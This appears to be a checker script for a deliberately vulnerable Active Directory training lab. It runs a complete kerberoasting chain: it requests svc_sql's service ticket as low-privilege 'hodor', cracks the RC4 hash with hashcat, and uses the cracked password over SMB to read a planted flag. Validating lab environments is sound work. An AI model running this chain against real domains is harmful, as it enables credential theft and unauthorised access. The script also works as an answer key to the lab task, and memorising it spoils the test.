#!/bin/bash
# Proves the kerberoast path end to end, as a student would, driven from inside the DC:
#   1. as hodor (low-privilege), get a TGT and request the TGS for svc_sql's SPN,
#   2. extract the $krb5tgs$ hash and crack it offline against a wordlist  -> svc_sql's password,
#   3. authenticate as svc_sql with the cracked password and read the vault flag,
#   4. confirm the flag matches the one the DC planted, and that hodor cannot read it.
# Exits 0 (and prints KERBEROAST_OK) only when every step holds, i.e. only when the DC is
# genuinely misconfigured: an SPN on a user account with a weak, RC4, wordlist-crackable key,
# and a flag gated behind that account.
#
# The TGS is requested with the native MIT client (kinit + kvno); impacket's own -request step
# does not interoperate with a Samba KDC (KRB_AP_ERR_INAPP_CKSUM), though impacket enumerates
# SPNs fine. Cracking uses hashcat mode 13100 (RC4 TGS-REP).
set -uo pipefail

# hashcat looks for its compiled-kernel cache under $HOME; keep it where the image warmed it.
export HOME=/root

REALM="NORTH.SEVENKINGDOMS.LOCAL"
HODOR_USER="hodor"
HODOR_PASS="Hodor123!"
SVC_USER="svc_sql"
SPN="MSSQLSvc/dc.north.sevenkingdoms.local:1433"
WORDLIST="/opt/kerberoast/wordlist.txt"
ROAST="/opt/impacket-venv/bin/python3 /opt/kerberoast/roast.py"
PLANTED="/srv/vault/flag.txt"

WORK="$(mktemp -d)"
export KRB5CCNAME="${WORK}/hodor.ccache"
trap 'kdestroy -A >/dev/null 2>&1 || true; rm -rf "${WORK}"' EXIT

fail() { echo "CHECK FAIL: $*" >&2; exit 1; }

echo "[1/4] authenticating as ${HODOR_USER} and requesting the TGS for ${SVC_USER}'s SPN ..." >&2
printf '%s' "${HODOR_PASS}" | kinit "${HODOR_USER}@${REALM}" >/dev/null 2>&1 \
  || fail "could not get a TGT as ${HODOR_USER}"
kvno "${SPN}" >/dev/null 2>&1 || fail "could not request the service ticket for ${SPN}"

HASH="${WORK}/tgs.hash"
${ROAST} "${KRB5CCNAME}" "${SPN}" > "${HASH}" 2>/dev/null || true
grep -q '\$krb5tgs\$' "${HASH}" 2>/dev/null || fail "no \$krb5tgs\$ hash extracted for ${SVC_USER}"
echo "      extracted: $(cut -c1-60 "${HASH}")..." >&2

echo "[2/4] cracking the TGS hash with hashcat (mode 13100) ..." >&2
POT="${WORK}/hc.pot"
hashcat -m 13100 -a 0 -O --force --quiet --self-test-disable \
  --potfile-path="${POT}" "${HASH}" "${WORDLIST}" >/dev/null 2>&1 || true
CRACKED="$(hashcat -m 13100 --potfile-path="${POT}" --show "${HASH}" 2>/dev/null | sed 's/.*://' | head -n1)"
[ -n "${CRACKED}" ] || fail "hashcat did not recover ${SVC_USER}'s password from the wordlist"
echo "      recovered ${SVC_USER} password: ${CRACKED}" >&2

echo "[3/4] reading the vault as ${SVC_USER} with the cracked password ..." >&2
OUT="${WORK}/flag.out"
smbclient //dc/vault -U "NORTH\\${SVC_USER}%${CRACKED}" -c "get flag.txt ${OUT}" >/dev/null 2>&1 \
  || fail "could not read the vault share as ${SVC_USER}"
[ -s "${OUT}" ] || fail "vault flag.txt came back empty"

echo "[4/4] confirming the flag matches what the DC planted ..." >&2
diff -q "${OUT}" "${PLANTED}" >/dev/null 2>&1 \
  || fail "flag read via ${SVC_USER} does not match the planted flag"

# Negative control: hodor (the foothold account) must NOT be able to read the vault.
if smbclient //dc/vault -U "NORTH\\${HODOR_USER}%${HODOR_PASS}" \
     -c "get flag.txt ${WORK}/hodor.out" >/dev/null 2>&1 && [ -s "${WORK}/hodor.out" ]; then
  fail "vault is readable by ${HODOR_USER}; the flag is not gated behind ${SVC_USER}"
fi

echo "CHECK PASS: ${HODOR_USER} -> TGS roast -> crack (${CRACKED}) -> ${SVC_USER} -> flag $(cat "${OUT}")" >&2
echo "KERBEROAST_OK"
